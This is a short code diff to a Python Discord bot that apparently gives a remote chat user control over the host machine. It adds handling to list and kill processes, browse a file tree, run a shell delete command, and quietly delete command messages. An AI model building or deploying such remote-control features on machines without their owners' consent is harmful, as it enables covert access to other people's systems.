@@ -140,9 +140,15 @@ async def on_reaction_add(reaction, user):
                 case '🔴':
                     if reaction.message.content[:15] == '```End of tree.':
                         for i in tree_messages:
-                            await i.delete()
+                            try: await i.delete()
+                            except: pass
                         tree_messages = []
                         os.system('del tree.txt')
+                    elif reaction.message.content[-25:] == '.kill <process-number>```':
+                        for i in processes_messages:
+                            try: await i.delete()
+                            except: pass
+                        processes_messages = []
 
                 case '📥':
                     if reaction.message.content[:15] == '```End of tree.':
@@ -368,6 +374,7 @@ async def on_message(message):
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
         elif message.content[:5] == '.show':
+            await message.delete()
             if message.content[6:] == 'processes':
                 processes, processes_list = [], []
                 for proc in process_iter():
